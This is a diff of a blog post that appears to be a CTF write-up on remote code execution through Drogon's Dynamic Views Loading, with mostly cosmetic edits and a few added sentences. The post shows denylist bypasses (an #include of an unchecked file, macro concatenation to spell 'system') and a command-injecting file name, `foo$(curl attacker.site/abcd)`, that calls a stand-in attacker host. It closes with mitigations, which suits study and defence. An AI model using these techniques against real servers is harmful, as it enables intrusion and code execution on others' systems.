@@ -1,5 +1,5 @@
 ---
-title: Dynamic Views Loading - Abusing Server Side Rendering in Drogon
+title: Dynamic Views Loading – Abusing Server Side Rendering in Drogon
 excerpt: What could go wrong releasing a C++ web server with "live reload" into the wild?
 tags:
   - cpp
@@ -8,22 +8,22 @@ tags:
   - programming
   - notes
   - writeup
-thumbnail_src: assets/drogon/drogon-thumbnail.png
+thumbnail_src: assets/drogon-thumbnail.png
 thumbnail_banner: true
 tocOptions: '{"tags":["h2","h3","h4"]}'
 related:
     posts: [attack-of-the-zip]
 # preamble: |
 ---
-Earlier this month, I released two CTF web challenges for CrewCTF 2024: Nice View 1 and Nice View 2. These build upon an earlier challenge — an audio synthesis web service running on the Drogon Web Framework. This time, our focus shifts from [exploring zip attacks in Juce](/posts/attack-of-the-zip) to exploring an alarming configuration in Drogon: Dynamic Views Loading (hereafter abbreviated DVL).
+Earlier this month, I released two CTF web challenges for CrewCTF 2024: Nice View 1 and Nice View 2. These build upon an earlier challenge — an audio synthesis web service running on the Drogon Web Framework. This time, our focus shifts from [exploring zip attacks in Juce](/posts/attack-of-the-zip/) to exploring an alarming configuration in Drogon: Dynamic Views Loading (hereafter abbreviated DVL).
 
 In a hypothetical situation where a Drogon server with DVL is exposed to hackers, how many holes can be poked? What attack vectors can be achieved?^[This situation may be less hypothetical than we think. According to Shodan, there are over 1000 servers around the world (mostly in East Asia) running Drogon. How many do you think were poorly configured, with devs thinking… “I’ll just enable Dynamic Views Loading for convenience. Nobody can find my IP anyway.” I’m willing to bet there’s at least 1.]
 
 At the same time, this is also a good exercise in defensive programming. If we released such a server, what (programming) defences are necessary to cover our sorry arse? When and where should we apply sanitisation and filtering? How do we properly allow “safe” programs? Is that even possible to begin with?
 
-This turned out to be a fascinating endeavour, as there are a *ton* of ways to compromise a vulnerable DVL-enabled server. In the making of the CTF challenges, I struggled to eliminate every single unintended solution.
+This turned out to be a fascinating endeavour, as we found a *ton* of ways to compromise a vulnerable DVL-enabled server. In the making of the CTF challenges, I struggled to eliminate every single unintended solution.
 
-{% image "assets/drogon/craft-a-ctf-web-chal.jpg", "w-60", "Every time I find an unintended solution, a new one is just around the corner." %}
+{% image "assets/craft-a-ctf-web-chal.jpg", "w-60", "Every time I find an unintended solution, a new one is just around the corner." %}
 
 <sup>Every time I find an unintended solution, a new one is just around the corner.</sup>{.caption}
 
@@ -101,7 +101,7 @@ After all, C++ is compiled, not interpreted.
 
 But it's possible to load compiled code at runtime through [shared objects](https://en.wikipedia.org/wiki/Shared_library). These are specially-compiled files which can be loaded on-the-fly. In Drogon, the process goes like so:
 
-{% image "assets/drogon/drogon-dynamic-view-loading.png", "w-50 alpha-imgv", "Flow Chart of Dynamic Views Loading" %}
+{% image "assets/drogon-dynamic-view-loading.png", "w-50 alpha-imgv", "Flow Chart of Dynamic Views Loading" %}
 
 <sup>Flow Chart of Dynamic Views Loading</sup>{.caption}
 
@@ -206,9 +206,11 @@ which generates Example.h and Example.cc.
 There are countless attack vectors to address.
 
 1. **RCE via Rendered CSP.** First, we'll start by looking at a simple PoC which triggers RCE when the view is rendered.
-2. **Bypasses.** We'll survey common C++ functions and tricks to bypass a denylist.
+2. **Bypasses.** We'll survey common functions and tricks to bypass a denylist.
 3. **RCE via Init Section.** Here, we'll trigger RCE without rendering the view.
 4. **RCE via File Name.** Finally, we'll discuss a harrowing insecurity in the DVL code path.
+
+Not all of these were exploitable in my CTF chals. I selected a few vectors which I thought were interesting.
 
 ### 1. RCE via Rendered CSP
 
@@ -225,7 +227,7 @@ To trigger this RCE, the application code needs to render the view with `HttpRes
 
 The following diagram shows where code execution occurs along the pipeline. We'll update the diagram as we explore other vectors.
 
-{% image "assets/drogon/drogon-dynamic-view-loading-exec-on-render.png", "w-60 alpha-imgv", "Vanilla RCE with Drogon DVL: we can execute code with `<%c++`." %}
+{% image "assets/drogon-dynamic-view-loading-exec-on-render.png", "w-60 alpha-imgv", "Vanilla RCE with Drogon DVL: we can execute code with `<%c++`." %}
 
 <sup>A simple and direct method of abusing CSPs. Execution occurs when the view is rendered, e.g. by calling `newHttpViewResponse`.</sup>{.caption}
 
@@ -370,14 +372,16 @@ Handy Reference: [Using Inline Assembly in C/C++](https://www.codeproject.com/Ar
 
 Filters applied to a set of file extensions can be easily bypassed by uploading a file with an unfiltered extension, then `#include`-ing it in the CSP. All `#include` really does is copy-paste the included file's content, which then gets compiled as C/C++ code.
 
-Assume .csp files are strictly checked, while all other files don't go through the same checks.
-
 - Example.csp - with stringent checks on denied words.
     ```cpp
     <%inc #include "safe.txt" %>
     ```
 
 - safe.txt - other C++ code which gets a free pass, possibly using a technique above.
+
+This allows us to bypass situations where, say, .csp files are strictly checked, but certain extensions are not checked at all.
+
+I'll admit this one slipped my mind and quite a few players discovered this unintended solution in the CTF chals.
 
 #### Bypass with Macro Token Concatenation (`##`)
 
@@ -400,7 +404,7 @@ C/C++ macros have some quirky features:
 
 The second feature allows us to bypass denylists which only match full words.
 
-For instance, if a denylist blocks `system`, we can do `GLUE(s, ystem)`. For instance:
+For instance, if a denylist blocks `system`, we can do `GLUE(s, ystem)`.
 
 ```cpp
 <%inc #define GLUE(X, Y) X ## Y %>
@@ -415,7 +419,7 @@ The previous tricks use `<%c++` which only executes when the view is rendered. B
 
 That's right, all we need is to load the .so to execute code!
 
-{% image "assets/drogon/drogon-dynamic-view-loading-exec-on-init.png", "w-60 alpha-imgv", "Code can be executed right after loading the .so binary." %}
+{% image "assets/drogon-dynamic-view-loading-exec-on-init.png", "w-60 alpha-imgv", "Code can be executed right after loading the .so binary." %}
 
 <sup>Using `<%c++` will execute code when "View is Rendered", but by strategically placing code in the `.init` section of the binary, we can get code to execute right after loading the .so!</sup>{.caption}
 
@@ -507,7 +511,7 @@ Remember how Drogon runs `drogon_ctl` to convert .csp files to .cc files? Guess 
 
 That’s right, `system()` is [called](https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/lib/src/SharedLibManager.cc#L169). And since the CSP file name can be pretty much anything — subject to Linux’s file path conditions — we can inject arbitrary commands and achieve RCE!
 
-{% image "assets/drogon/drogon-dynamic-view-loading-exec-on-filename.png", "w-70 alpha-imgv", "Malicious code can be executed when `drogon_ctl` is run using the filename." %}
+{% image "assets/drogon-dynamic-view-loading-exec-on-filename.png", "w-70 alpha-imgv", "Malicious code can be executed when `drogon_ctl` is run using the filename." %}
 
 Additionally, our command can contain slashes, since Drogon recursively scans subdirectories. A file named `foo$(curl attacker.site/abcd)` will be treated as a folder (`foo$(curl attacker.site/`) + a file (`abcd)`).
 
@@ -532,7 +536,7 @@ And mitigations?
     - It doesn't matter if the view will be rendered in application code, because — [as we discovered earlier](#4-rce-via-file-name) — once `drogon_ctl` is run, an RCE endpoint is already exposed.
 4. If, on the off chance, your environment accepts untrusted CSP files, you should consider using some filtering/denylist mechanism.
     - If filtering is performed, it should happen before files are written to the dynamic views directory. Once files are written, it's (likely) too late: Drogon kicks in and devours the CSP.
-    {% image "assets/drogon/drogon-dynamic-view-loading-defence.png", "w-70 alpha-imgv", "Defensive filtering, if any, should occur before CSP files are written." %}
+    {% image "assets/drogon-dynamic-view-loading-defence.png", "w-70 alpha-imgv", "Defensive filtering, if any, should occur before CSP files are written." %}
     <p class="caption">
     <sup>Defensive filtering, if any, should occur before CSP files are written.</sup>
     </p>
